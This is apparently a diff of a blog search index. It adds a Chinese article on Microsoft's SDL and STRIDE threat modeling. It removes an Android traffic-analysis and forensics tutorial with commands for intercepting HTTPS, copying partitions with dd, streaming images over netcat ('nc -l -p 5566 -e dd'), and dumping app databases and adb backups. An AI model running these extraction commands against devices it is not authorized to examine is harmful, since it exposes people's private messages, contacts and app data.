+<h3 id="2-1-攻击面最小化"><a href="#2-1-攻击面最小化" class="headerlink" title="2.1 攻击面最小化"></a>2.1 攻击面最小化</h3><p>攻击面是指程序任何能被用户或其他程序访问到的部分，这些暴露给用户的地方往往是最可能被恶意攻击者攻击的地方。攻击面最小化是指尽量减少暴露恶意用户可能发现并试图利用的攻击面数量。软件产品的受攻击面包括代码、接口、服务以及包括对所有用户提供服务的协议，尤其是那些未被验证或远程用户都可以访问到的协议。供给面分析主要着重于：</p>
+<ul>
+<li>降低默认执行的代码量</li>
+<li>限制可访问到代码的人员范围</li>
+<li>限定可访问到代码的人员身份</li>
+<li>降低代码执行所需的权限</li>
+</ul>
+<p>攻击面分析常用技巧：</p>
+<hr>
+<table>
+<thead>
+<tr>
+<th>高风险攻击面</th>
+<th>低风险攻击面</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>默认开启</td>
+<td>默认关闭</td>
+</tr>
+<tr>
+<td>接口开启</td>
+<td>接口关闭</td>
+</tr>
+<tr>
+<td>UDP协议</td>
+<td>TCP协议</td>
+</tr>
+<tr>
+<td>匿名访问</td>
+<td>经过身份验证的用户访问</td>
+</tr>
+<tr>
+<td>保持开启</td>
+<td>需要时开启</td>
+</tr>
+<tr>
+<td>可互联网访问</td>
+<td>仅本地网络访问</td>
+</tr>
+</tbody>
+</table>
+<p>攻击面最小化在微软的应用实践示例：</p>
+<hr>
+<table>
+<thead>
+<tr>
+<th>应用程序</th>
+<th>安全实践</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows</td>
+<td>RPC需要认证、防火墙默认打开</td>
+</tr>
+<tr>
+<td>IIS6.0、7.0</td>
+<td>使用Network Service权限运行，默认关闭</td>
+</tr>
+<tr>
+<td>SQL Server 2008</td>
+<td>xp_cmdshell存储过程默认关闭，默认不开放远程链接</td>
+</tr>
+<tr>
+<td>VS 2005/2008</td>
+<td>Web Server金额SQL Server默认仅本地访问</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-2-基本隐私"><a href="#2-2-基本隐私" class="headerlink" title="2.2 基本隐私"></a>2.2 基本隐私</h3><p>用户使用软件时可能需要授予软件收集个人隐私信息的权限，企业有责任完善对个人信息的保护措施，确保用户隐私的安全性，隐私安全是建立可信任应用程序的关键因素。<br>在软件设计时考虑用户基本隐私的必要性和意义：</p>
+<ul>
+<li>履行法律规定和义务</li>
+<li>增加客户信赖</li>
+<li>防止堵塞部署</li>
+</ul>
+<p>在获取和收集用户隐私过程中，需要制定明确的隐私准则，以下是对用户隐私收集的部分建议：</p>
+<ul>
+<li>只收集程序必需的隐私数据，明确告知用户并征得用户同意。</li>
+<li>微软对于用户隐私数据（密码、口令等）需要加密存储，最低要求是SHA256+salt，对于更高要求的需要使用PBKDF2算法加密存储。</li>
+</ul>
+<h3 id="2-3-权限最小化"><a href="#2-3-权限最小化" class="headerlink" title="2.3 权限最小化"></a>2.3 权限最小化</h3><p>在进行软件设计时，安全设计人员可以评估应用程序的行为和功能所需的最低权限和访问级别，从而合理分配相应的权限，如果程序特定情况必须需要更高权限，也可以考虑特权赋予及释放机制，即使程序遭到攻击，也可以将损失降到最低。<br>常见的权限最小化实践如下：</p>
+<ul>
+<li>普通管理员/系统管理员等角色管理</li>
+<li>文件只读权限/文件访问权限等访问控制</li>
+<li>进程/服务以所需的最小用户权限运行</li>
+</ul>
+<p>权限最小化在微软的应用实践：</p>
+<ul>
+<li>Windows系统中网络进程、本地服务、用户进程的权限都较低且互相独立，分别为NETWORK SERVICE、LOCAL SERVICE、user权限，只有核心的重要进程使用SYSTEM权限。</li>
+<li>最新版本的office程序打开不可信来源的文档时，默认是不可编辑的，同时也是默认不可执行代码的，即使存在缓冲区溢出漏洞，也不会执行shellcode等恶意代码。</li>
+</ul>
+<h3 id="2-4-默认安全"><a href="#2-4-默认安全" class="headerlink" title="2.4 默认安全"></a>2.4 默认安全</h3><p>默认安全配置在客户熟悉安全配置选项前不仅有利于更好的帮助客户掌握安全配置经验，同时也可以确保应用程序初始状态下处于较安全状态，用户可根据实际使用情况决定应用程序安全与隐私等级水平是否降低。<br>默认安全在微软的应用实践：</p>
+<ul>
+<li>在Windows 7之后的Windows操作系统中，DEP（数据执行保护）默认开启，用户可根据需要选择DEP开启状态。</li>
+<li>Windows 10默认启用安全防护软件Windows Defender，用户可根据需要选择是否开启。</li>
+</ul>
+<h3 id="2-5-纵深防御"><a href="#2-5-纵深防御" class="headerlink" title="2.5 纵深防御"></a>2.5 纵深防御</h3><p>纵深防御包含两层含义：首先，要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体；其次，要在解决根本问题的地方实施针对性的安全方案。<br>纵深防御在微软的应用实践：</p>
+<ul>
+<li>针对XSS防护，除了要对用户输入的特殊符号进行过滤，还要区分是否是富文本进而进行相应编码操作，在输入时过滤的同时在输出时也进行过滤操作。</li>
+<li>即使做了十足的过滤、编码等安全防护，为了进一步确保缓解XSS攻击，Web站点也可以对cookie启用HTTP-Only属性，确保即使发生XSS攻击，也可以阻止通过脚本访问cookie。</li>
+</ul>
+<h3 id="2-6-威胁建模"><a href="#2-6-威胁建模" class="headerlink" title="2.6 威胁建模"></a>2.6 威胁建模</h3><p>威胁建模是一种分析应用程序威胁的过程和方法，威胁是指恶意用户可能试图利用以破坏系统，漏洞是一个特定的可以被利用的威胁。<br>威胁建模的一般流程如下：</p>
+<ul>
+<li>与系统架构师及设计人员沟通，了解设计详情。</li>
+<li>使用成熟的威胁建模方法分析当前设计潜在的安全问题。</li>
+<li>提出安全建议及对潜在威胁的缓解措施。</li>
+<li>对安全设计进行验证并对整个设计方案进行回顾并再次确认。</li>
+</ul>
+<h2 id="三、STRIDE威胁建模"><a href="#三、STRIDE威胁建模" class="headerlink" title="三、STRIDE威胁建模"></a>三、STRIDE威胁建模</h2><h3 id="3-1-STRIDE介绍"><a href="#3-1-STRIDE介绍" class="headerlink" title="3.1 STRIDE介绍"></a>3.1 STRIDE介绍</h3><p>STRIDE威胁建模是微软提出的一种威胁建模方法，该方法将威胁类型分为Spoofing（仿冒）、Tampering（篡改）、Repudiation（抵赖）、Information Disclosure（信息泄露）、Denial of Service（拒绝服务）和Elevation of Privilege（权限提升）。六种威胁的首字母缩写就是STRIDE，STRIDE威胁模型几乎涵盖目前大部分安全问题。</p>
+<h3 id="3-2-STRIDE威胁建模流程"><a href="#3-2-STRIDE威胁建模流程" class="headerlink" title="3.2 STRIDE威胁建模流程"></a>3.2 STRIDE威胁建模流程</h3><p>STRIDE威胁建模一般流程如下：</p>
+<ul>
+<li>绘制数据流图</li>
+<li>识别威胁</li>
+<li>提出缓解措施</li>
+<li>安全验证</li>
+</ul>
+<p><img src="/images/stride.png" alt></p>
+<p>3.2.1 数据流图</p>
+<p>数据流图（Data Flow Diagrams）包含外部实体（External Entity）、处理过程（Process）、数据流（Data Flow）、数据存储（Data Store），安全人员与系统架构师及设计人员沟通，了解设计详情并画出数据流图后还需要标注信任边界（Trust Boundary），针对简单Web应用的数据流图如下：</p>
+<p><img src="/images/Data_Flow_Diagrams.png" alt></p>
+<p>3.2.2 识别威胁</p>
+<p>STRIDE威胁建模方法明确了每个数据流图元素具有不同的威胁，其中外部实体只有仿冒和抵赖威胁，数据流只有篡改、信息泄露、拒绝服务威胁，处理过程有全部六种威胁，存储过程有篡改、信息泄露、拒绝服务威胁，但如果是日志类型存储则还有抵赖威胁。具体可以对照如下表格进行威胁识别：</p>
+<p>数据流图元素对应不同威胁</p>
+<hr>
+<table>
+<thead>
+<tr>
+<th>元素</th>
+<th>S</th>
+<th>T</th>
+<th>R</th>
+<th>I</th>
+<th>D</th>
+<th>E</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>外部实体</td>
+<td>√</td>
+<td></td>
+<td>√</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>处理过程</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>数据存储</td>
+<td></td>
+<td>√</td>
+<td>?</td>
+<td>√</td>
+<td>√</td>
+<td></td>
+</tr>
+<tr>
+<td>数据流</td>
+<td></td>
+<td>√</td>
+<td></td>
+<td>√</td>
+<td>√</td>
+</tr>
+</tbody>
+</table>
+<p>3.2.3 缓解措施</p>
+<p>根据不同数据流图元素及威胁，相应的缓解措施也不相同。在提出缓解措施时，有时不仅要考虑安全问题，也要考虑软件的易用性。微软对于常见威胁给出了常用的标准缓解措施，并在具体实施时已将常用的缓解方案及措施集成为独立的解决方案或代码模块，方便同类型应用直接使用。</p>
+<p>微软给出的常见威胁类型的缓解措施：</p>
+<hr>
+<table>
+<thead>
+<tr>
+<th>威胁类型</th>
+<th>缓解措施</th>
+<th>技术方案</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>仿冒（S）</td>
+<td>认证</td>
+<td>Kerberos认证</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>PKI系统如SSL/TLS证书</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>数字签名</td>
+</tr>
+<tr>
+<td>篡改（T）</td>
+<td>完整性保护</td>
+<td>访问控制</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>完整性校验</td>
+</tr>
+<tr>
+<td>抵赖（R）</td>
+<td>日志审计</td>
+<td>强认证</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>安全日志、审计</td>
+</tr>
+<tr>
+<td>信息泄露（I）</td>
+<td>保密性</td>
+<td>加密</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>访问控制列表</td>
+</tr>
+<tr>
+<td>拒绝服务（D）</td>
+<td>可用性</td>
+<td>访问控制列表</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>过滤</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>备份</td>
+</tr>
+<tr>
+<td>权限提升（E）</td>
+<td>授权认证</td>
+<td>输入校验</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>用户组管理</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>访问控制列表</td>
+</tr>
+</tbody>
+</table>
+<p>3.2.4 安全验证</p>
+<p>在威胁建模完成后，需要对整个过程进行回顾，不仅要确认缓解措施是否能够真正缓解潜在威胁，同时验证数据流图是否符合设计，代码实现是否符合与其设计，所有的威胁是否都有相应的缓解措施。最后将威胁建模报告留存档案，作为后续迭代开发、增量开发时威胁建模的参考依据。</p>
+<h2 id="四、安全开发生命周期流程"><a href="#四、安全开发生命周期流程" class="headerlink" title="四、安全开发生命周期流程"></a>四、安全开发生命周期流程</h2><h3 id="4-1-需求阶段"><a href="#4-1-需求阶段" class="headerlink" title="4.1 需求阶段"></a>4.1 需求阶段</h3><p>安全系统开发的一个基本原则时需要“自上而下”地考虑安全问题，尽管很多开发项目开发出的“后续版本”是建立在先前发布的版本基础上，但是新的发行版本的需求阶段和初始规划仍然为构建安全软件提供了好的机会。</p>
+<p>在需求阶段中，产品小组与中央安全小组联系，请求指派安全顾问，该安全顾问在进行规划时充当联络点，并提供资源和指导。安全顾问通过审核计划、提出建议和确保安全小组规划适当的资源来支持产品小组的日程，为产品小组提供协助。安全顾问在安全标准方面向产品小组提出建议，这些安全标准由项目规模、复杂程度和风险决定的。从项目开始到完成最终安全审核和软件发布，安全顾问始终充当产品小组与安全小组之间的联系点。安全顾问还充当安全小组和产品小组管理人员之间的联系人，向小组管理人员提供关于项目的安全要素是否正常工作的意见，以避免在流程的晚期出现安全方面的问题。</p>
+<p>在需求阶段中，产品小组应考虑如何在开发流程中集成安全性，找出关键的安全性对象，以及在尽量提升软件安全性的同时尽量减少对计划和日程的影响。在此过程中，产品小组需要考虑如何使软件的安全功能和保证措施与其他可能与该软件配合使用的软件相互集成。要满足用户将各个产品集成到安全系统的需要，考虑与其他软件的接口非常关键。产品小组关于安全目标、挑战和计划的整体构想必须反映到需求阶段中制作的规划文档中，虽然计划可能会随着项目的进行而变化，但是较早明确制订这些计划将有助于确保不会忽视任何需求或不会直接到最后一刻才发现它们。</p>
+<p>每个产品小组都应将安全性要求视为此阶段的重要组成部分，尽管有些安全性要求将在威胁建模过程中确定，但是用户需求可能要求根据客户的要求来考虑一些安全性。符合行业标准或认证过程的需要也可能提出一些安全性要求，作为正常规划流程的一部分，产品小组应认识到并反映这些要求。</p>
+<h3 id="4-2-设计阶段"><a href="#4-2-设计阶段" class="headerlink" title="4.2 设计阶段"></a>4.2 设计阶段</h3><p>设计阶段确定软件的总体需求和结构，从安全性的角度来看，设计阶段的关键要素包括：</p>
+<ul>
+<li>定义安全体系结构和设计指导原则：从安全性角度定义软件的总体结构，并确定对安全性起关键作用的组件（“可信赖计算基础”）。确定将在软件中全面应用的设计技巧，如分层、使用强类型语言、应用最低权限和使攻击面最小化。分层指的是将软件组织成精心定义的组件以避免组件之间出现循环依赖关系–将组件组织为层，高级层可以依赖低级层的服务，且禁止低级层依赖高级层的服务。体系结构中各要素的特点将在各自的设计规范中详细说明，而安全体系结构只是确定安全设计的总体构想。</li>
+<li>记录软件攻击面的要素。由于软件不可能绝对的安全，所以必须重视默认情况下应仅将大多数用户需要使用的功能对所有用户开放，且可以用尽可能最低的权限安装那些功能。对攻击面要素进行度量可为产品小组提供默认安全性的现行度量标准，使产品小组可以检测到令软件易受攻击的情况。尽管有些增加攻击面的情况可能是因为增加了产品功能或可用性导致的，但是在设计和实施过程中还是需要对每种这样的情况进行认真检测和研究，以确保软件交付时在默认配置下有最好的安全性。</li>
+<li>对威胁进行建模。产品小组逐个组件地对威胁进行建模，组件小组使用结构化的方法，确定软件必须管理的模块以及访问那些模块时使用的接口。威胁建模过程确定可能对每个模块造成损害的威胁以及导致损害的可能性（风险评估）。组件小组然后确定降低风险的对策–通过安全功能（如加密）或通过正确使用保护模块免受损害的软件。这样威胁建模可以帮助产品小组确定安全性需求，以及需要特别仔细地审核代码和进行安全测试的领域。应使用工具来支持威胁建模过程，该工具可以处理机器可读格式的威胁模型，并可以对其进行存储和更新。</li>
+<li>定义补充性交付标准。尽管应定义组织的基本安全交付标准，但是各个产品小组或软件版本也可以设计发布软件前必须符合的特定标准。例如正在开发一个准备交付用户使用并可能面临高强度攻击的软件更新版本的产品小组可以建立以下标准：在一段时间内外部没有发现新版本漏洞时才认定它已做好发布准备。（也就是说，开发过程应在漏洞被报告之前找到并消除这些漏洞，而不是在产品小组接到报告之后不得不修复这些漏洞）</li>
+</ul>
+<h3 id="4-3-实施阶段"><a href="#4-3-实施阶段" class="headerlink" title="4.3 实施阶段"></a>4.3 实施阶段</h3><p>在实施阶段，产品小组对软件进行编码、测试和集成。在此阶段将采取措施消除安全缺陷或防止引入安全缺陷的作用很大–这些措施将大大减少安全漏洞遗留到发布给用户的软件最终版本中的可能性。威胁建模的成果会为实施阶段提供重要指导，开发者应特别注意确保代码的正确性以消除高优先级威胁，测试者可集中对这些威胁进行测试以确保将其拦截或消除。</p>
+<p>在实施阶段中应用的SDL要素为：</p>
+<ul>
+<li>应用编码和测试标准。编码标准帮助开发者避免引入导致安全漏洞的缺陷。如使用更安全和更一致的字符串处理和缓冲区操纵结构有助于避免引入缓冲区溢出漏洞。测试标准和最佳做法有助于确保将测试重点放在检测潜在的安全漏洞上，而不仅仅是专注于测试软件功能的正确运行。</li>
+<li>应用包括模糊化工具在内的安全测试工具。“模糊化”为软件应用程序编程接口（API）和网络接口提供结构化但无效的输入，以使检测到可能导致软件漏洞的错误的可能性最大化。</li>
+<li>应用静态分析代码扫描工具。这些工具可检测出某些类型的可能导致漏洞的编码缺陷，包括缓冲区溢出、整数溢出和未初始化变量。Microsoft长期使用的两个这类工具使PREfix和PREfast。</li>
+<li>进行代码审核。作为自动化工具和测试的补充，将由接受过培训的开发人员进行代码审核，他们将检查源代码并检测和消除潜在的安全漏洞，这是开发流程中从软件中消除安全漏洞的关键步骤。</li>
+</ul>
+<h3 id="4-4-验证阶段"><a href="#4-4-验证阶段" class="headerlink" title="4.4 验证阶段"></a>4.4 验证阶段</h3><p>验证阶段是指软件已具备所有功能并进入用户试用版测试的阶段。在此阶段中对软件进行试用版测试时，产品小组进行安全推进，包括进行安全代码审核和集中式安全测试。</p>
+<p>在流程中引入安全推进有两个原因：</p>
+<ul>
+<li>有问题的软件版本已进入生命周期的验证阶段，此阶段最适合进行所需的集中式代码审核和测试。</li>
+<li>在验证阶段进行安全推进可确保代码审核和测试针对的是软件的完成版本，并提供了对实施阶段开发或更新的代码以及未修改的遗留代码进行全部审核的机会。</li>
+</ul>
+<h3 id="4-5-发布阶段"><a href="#4-5-发布阶段" class="headerlink" title="4.5 发布阶段"></a>4.5 发布阶段</h3><p>在发布阶段中，应对软件进行最终安全审核（FSR）。FSR的目标是确定从安全角度看，此软件是否已准备好交付给客户。一般在软件完成之前2到6个月进行FSR，具体时间根据软件的规模决定。在进行FSR之前，软件必须已处于稳定状态，且只剩一些很小的非安全性更改需要在发布前完成。<br>FSR是由组织的中央安全小组对软件进行的独立审核。在进行FSR之前，来自安全小组的安全顾问向产品小组建议软件所需进行FSR的范围，并为产品小组提供资源需求列表。产品小组为安全小组提供完成FSR所需的资源和信息。FSR开始时，产品小组需要填写一份问卷并与进行FSR的安全小组成员进行面谈。所有FSR将要求对最初标识为安全漏洞，但后来经过深入分析确定为对安全性没有影响的缺陷进行审核，以确保分析的正确性。FSR还包括审核软件是否能抵御最新报告的影响类似软件的漏洞。对主软件版本进行FSR时需要进行渗透测试，可能还需要利用外面的安全审核承包商来协助安全小组。<br>FSR不是简单的通过/失败测试，FSR的目标也不是找出软件中所有剩余漏洞，实际上FSR是为产品小组和组织的高层管理人员提供软件的安全水平以及软件发布给用户后抵御攻击的能力和总体状况。如果FSR发现某类剩余漏洞，正确的反应不仅要修复发现的漏洞，还要回到之前的阶段并采取其他针对性的措施解决根本原因（如提高培训质量和改进工具）。</p>
+<h3 id="4-6-支持和服务阶段"><a href="#4-6-支持和服务阶段" class="headerlink" title="4.6 支持和服务阶段"></a>4.6 支持和服务阶段</h3><p>尽管在开发过程中应用了SDL，最先进的开发方法仍无法保证软件完全消除漏洞。即使开发流程可以在交付之前从软件中消除所有漏洞，还是可能被发现新的攻击方式，因此产品小组必须准备好对交付给用户的软件中新发现的漏洞作出响应。<br>响应过程包括评估漏洞报告并在适当的适合发布安全建议和更新，还包括对已报告的漏洞进行事后检查及采取必要的措施。对漏洞采取的措施的范围很广：从为孤立的错误发布更新到更新代码扫描工具以重新对主要的子系统进行代码审核。响应阶段的目标是从错误中吸取教训，并使用漏洞报告中提供的信息帮助在软件投入使用前检测和消除深层漏洞，以免这些漏洞给用户带来危害。响应过程还有助于产品小组和安全小组对流程进行改造，以免将来犯类似错误。</p>
+<h2 id="五、应用安全开发生命周期的观察"><a href="#五、应用安全开发生命周期的观察" class="headerlink" title="五、应用安全开发生命周期的观察"></a>五、应用安全开发生命周期的观察</h2><h3 id="5-1-SDL各要素的有效性"><a href="#5-1-SDL各要素的有效性" class="headerlink" title="5.1 SDL各要素的有效性"></a>5.1 SDL各要素的有效性</h3><p>SDL由大量子流程组成，这些子流程分布整个软件开发生命周期内，威胁建模是SDL中最高优先级的子流程。威胁建模不能孤立的应用：威胁建模促进设计、代码审核和测试，一个流程如果只实施威胁建模但对模型不采取任何响应措施，将无法达到期望效果。威胁建模的主要作用在于确保不产生导致安全漏洞的缺陷。<br>FSR的要素之一–渗透测试并不是获得安全性的好方法，产品小组在整个生命周期中的活动主要集中在威胁建模、代码审核、自动化工具的使用以及模糊化测试，而不是渗透测试。这些措施在防止或消除安全缺陷方面比经典的特定渗透测试更加全面有效。FSR的渗透测试要素有助于判断软件是否已准备好可以发布，而不适合作为发现和修复安全缺陷的方法。如果在FSR阶段进行的渗透测试发现了大量的安全缺陷，则是因为早期阶段不够有效，正确的处理方法是重新检查那些阶段中所谓已完成的活动，而不是仅仅修复渗透测试缺陷就发布软件。</p>
+<h3 id="5-2-工具、测试和代码审核"><a href="#5-2-工具、测试和代码审核" class="headerlink" title="5.2 工具、测试和代码审核"></a>5.2 工具、测试和代码审核</h3><p>静态分析工具、模糊测试和代码审核的作用是互补性的，静态分析工具在发现许多会导致安全漏洞的编码错误（尤其是缓冲区溢出）方面很有效。但是SDL要求仍需要进行手动代码审核，一方面是为了检测到工具未发现的错误，另一方面是为确定可以在哪些方面改进这些工具。<br>模糊化测试对SDL流程能够产生非常积极的成果，与静态代码扫描工具不同，必须为要测试的每种文件格式和网络协议分别构建模糊化测试工具，因此通常可以发现静态分析工具遗漏的错误。威胁模型有助于产品小组划分要测试的接口和格式的优先级，模糊化测试的结构不是完全确定性的（这些工具只允许有限循环次数，无法确保发现所有漏洞），但是经验表明进行适当级别的模糊化测试可以发现一些软件缺陷，在某些情况下此类缺陷可能导致安全问题。</p>
+<h3 id="5-3-投资"><a href="#5-3-投资" class="headerlink" title="5.3 投资"></a>5.3 投资</h3><p>强制安全培训对多数公司来说会产生较高的资金投入，培训可分为现场培训和在线学习两种。现场培训对准备进行安全推进或其他关键活动的小组进行全员培训特别有效。</p>
+<h3 id="5-4-收益"><a href="#5-4-收益" class="headerlink" title="5.4 收益"></a>5.4 收益</h3><p>Microsoft的经验已经表明SDL在消除和减少软件漏洞方面产生相当好的效果，Microsoft还会评估外部报告的漏洞对正在开发的软件版本的影响。</p>
+<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>Microsoft的经验表明SDL在减少安全漏洞方面非常有效。实施组成SDL的要素越多，对安全性的提升也就越多，这也是视为有效流程的一个特征。SDL的核心理念是将安全考虑集成在软件开发的每个阶段：需求分析、设计、编码、测试和维护。从需求、设计到产品发布的每个阶段都增加相应的安全活动，以减少软件中漏洞的数量并将安全缺陷降低到最小程度。</p>
+<p>七、参考文献</p>
+<p>[1] <a href="https://docs.microsoft.com/zh-cn/previous-versions/ms995349(v=msdn.10)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/ms995349(v=msdn.10)</a><br>[2] <a href="http://blog.nsfocus.net/sdl/" target="_blank" rel="noopener">http://blog.nsfocus.net/sdl/</a></p>
+]]></content>
       <categories>
-        <category>Android安全</category>
+        <category>软件安全设计</category>
       </categories>
       <tags>
-        <tag>Android安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Android流量分析和取证]]></title>
-    <url>%2F2019%2F04%2F10%2FAndroid%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%92%8C%E5%8F%96%E8%AF%81%2F</url>
-    <content type="text"><![CDATA[应用程序通常会在网络数据中泄漏敏感信息，也会经常遇到使用不安全网络协议进行身份验证和会话管理的应用程序。因此，安全流量分析是Android渗透测试过程中重要一环。 Android流量分析方式Android流量分析分为主动分析和被动分析，区别如下： 被动分析：在被动分析中，应用程序发送的网络流量不会被拦截，攻击者通过嗅探工具嗅探所有流量包，并用分析器分析其中可能泄漏的敏感数据或安全漏洞。 主动分析：在主动分析中，攻击者主动拦截所有正在进行的网络通信，并对数据包进行分析、评估或修改。该过程需要设置代理，通过应用和设备的所有网络流量全部通过该代理程序。 被动分析下载tcpdump-arm二进制文件https://www.androidtcpdump.com/android-tcpdump/downloads，然后使用adb的push命令将二进制文件推送到Android的/data/local/tmp目录。同样的，需要从设备中拉取内容的情况下可以使用pull命令。 1$ adb push tcpdump /data/local/tmp/tcpdump 使用chmod命令对tcpdump授予执行权限 1# chmod 777 /data/local/tmp/tcpdump 运行tcpdump并将抓取的数据包输出到.pcap文件。 1# ./tcpdump -v -s 0 -w output.pcap -s：从每个封包抽取给定字节的数据，默认65535字节。-v：输出详细数据。-w：写入原始数据包的文件名。 在抓包过程中，使用手机浏览器访问互联网，tcpdump会抓取该过程网络流量。抓包完成后使用adb pull命令拉取抓到的流量文件。 1$ adb pull /data/local/tmp/output.pcap output.pcap 如果提示需要修改output.pcap文件权限才能拉取，使用chmod 666 output.pcap修改后拉取。最后使用wireshark对数据包进行分析。 主动分析HTTP流量拦截：以命令行方式启动可读写权限，并设置代理。 1$ emulator -avd [avd_name] -http-proxy 127.0.0.1:8080 -writable-system 然后启动Burpsuite并配置好本地代理，模拟器产生的所有网络流量就能够全部抓取到。 HTTPS流量拦截：对于HTTPS流量的代理设置需要安装Burpsuite CA证书。首先在本地http://burp下载CA证书cacert.der，导入本地浏览器后导出PortSwiggerCA.crt证书文件。然后使用命令push到模拟器中。 1$ adb push PortSwiggerCA.crt /mnt/sdcard/PortSwiggerCA.crt 最后到模拟器中从SD卡安装证书，完成安装就可以使用Burpsuite抓取HTTPS流量。 Genymotion模拟器流量拦截：Genymotion模拟器代理配置有点坑，摸索好长时间发现只能通过模拟器里WIFI高级代理设置，然后在Burpsuite中设置相同IP地址的代理IP。 HTTPS流量拦截配置同样需要安装CA证书即可。另外可以尝试fiddler和charles抓包分析。 应用程序流量安全防护需要保证HTTPS协议的安全连接，并配置安全证书。这种场景中对HTTPS流量拦截需要分析应用程序验证证书的方式，甚至需要对程序进行逆向、修改和重新编译。 Android取证取证是使用自动或手动方式从设备中提取和分析数据的过程，大致分为逻辑采集和物理采集。 逻辑采集：取证人员与设备交互并从文件系统中提取数据，数据涉及通讯录、信息、通话记录、浏览器历史、各类应用数据等任何内容。优点是大多数情况下比物理采集更容易获取逻辑信息，但存在数据被篡改的风险。 物理采集：该取证方式需要对物理存储介质进行逐位拷贝，该方法耗时长，但更可靠。 Android文件系统的主分区通常为YAFFS2(Yet Another Flash File System 2)，YAFFS是由Aleph One公司所发展出来的NAND flash 嵌入式文件系统，为设备提供了更高的效率和性能，以及更低的占用空间。 使用adb shell进入shell命令行，查看/proc/mtd或/proc/partitions文件可查看Android设备分区情况。Android系统一般包括system，cache，data，boot等，同样可以使用mount命令查看已挂载分区和类型。 使用dd提取数据取证过程一般要求不能直接对取证设备进行操作，linux下dd工具可以完整复制取证系统且不做任何修改。 1.使用cat /proc/mtd或cat /proc/partitions查找目标分区。2.使用dd命令将目标分区复制到/mnt/sdcard中。 1$ dd if=[源文件] of=[目标文件] count=1 bs=512 3.等待操作完成，使用adb pull命令将复制的分区文件拉取到本地。 1$ adb pull /mnt/sdcard/data.img data.img 4.另外可以使用Netcat将映像直接保存到远程系统，需要将端口从设备转发到系统，并使用Netcat监听5566端口，然后进入adb shell使用dd工具将输出转发到Netcat。 12345adb forward tcp:5566 tcp:5566nc 127.0.0.1 5566 &gt; data.imgnc -l -p 5566 -e dd if=[源文件] 使用Andriller提取数据Andriller是用python编写的开源多平台取证工具，该工具有助于从设备中提取一些基本信息并进行取证分析，并生成HTML取证报告。Andriller下载地址：https://www.andriller.com/download/ 使用AFLogical提取联系人、通话记录和短信AFLogical是一款开源Android取证框架，可以从设备创建逻辑采集并将结果呈现给取证人员，包括提取联系人、通话记录和短信等关键组件。AFLogical下载地址：https://github.com/nowsecure/android-forensics，将下载的.apk文件安装到模拟器并运行，选择需要提取的信息，然后单击Capture，AFLogical会将选择的信息提取保存到SD卡的csv文件中。完成后就可以使用adb pull命令将提取的csv文件拉取到本地。 手动转储应用的数据库在某些情况下，需要使用手动方式从设备中提取一些信息，由于应用程序大多使用数据库存储数据，如应用程序目录/data/data/com.android.xxx/databases文件夹。Android大部分使用SQLite数据库和.db文件格式，可以安装以下步骤手动提取数据库文件。 进入取证设备目录，并创建一个文件夹存储提取的数据库文件。 1$ mkdir /mnt/sdcard/DBBack 查找所有.db文件并复制到创建的文件夹中。 1$ find . -name "*.db" -type f -exec cp &#123;&#125; /mnt/sdcard/DBBack \; 使用tar或zip将文件夹压缩并使用adb pull目录拉取到本地系统。 123$ tar cvf dbback.tar DBBack/$ adb pull /mnt/sdcard/dbback.tar dbback.tar 将文件拉取到本地后，解压文件即可对数据库文件进行分析。分析SQLite数据库文件可以使用SQLite数据库浏览器,下载地址：https://github.com/sqlitebrowser/sqlitebrowser。 使用logcat记录日志在某些情况下，Android logcat可以辅助取证过程，可以收集包括电话及录音机上执行的操作日志。使用adb logcat捕获保存logcat转储文件并输出到指定文件，以供后续分析。 1$ adb logcat &gt; logcat_dump.log logcat还可以设置其他参数收集特定内容的日志：-b：显示缓冲区（如radio收音机）的logcat。-v：控制输出格式，如verbose，time，tag，等。-d：调试。 1$ adb logcat -v time -b radio -d 另外可以使用dmesg打印内核消息，使用getprop打印设备属性adb shell getprop。 使用备份功能提取应用数据Android 4.0开始引入adb备份功能，用于创建应用程序备份及完整数据，此功能可用于取证过程捕获全部数据。 使用pm list查找目标应用程序包。 1$ adb shell pm list package -f chrome 使用adb backup备份目标应用程序，备份文件为.ab格式。 1$ adb backup [package_name] -f [target_file].ab 运行命令之后需要到模拟器设备上进行确认操作，并选择设置密码。然后使用dd和openssl创建.tar压缩文件。 1$ dd if=[target_file].ab bs=24 skip=1 | openssl zlib -d &gt; [file].tar 然后就可以解压文件分析数据库.db文件。]]></content>
-      <categories>
-        <category>Android安全</category>
-      </categories>
-      <tags>
-        <tag>Android安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Android逆向及安全漏洞审计]]></title>
-    <url>%2F2019%2F04%2F09%2FAndroid%E9%80%86%E5%90%91%E5%8F%8A%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%2F</url>
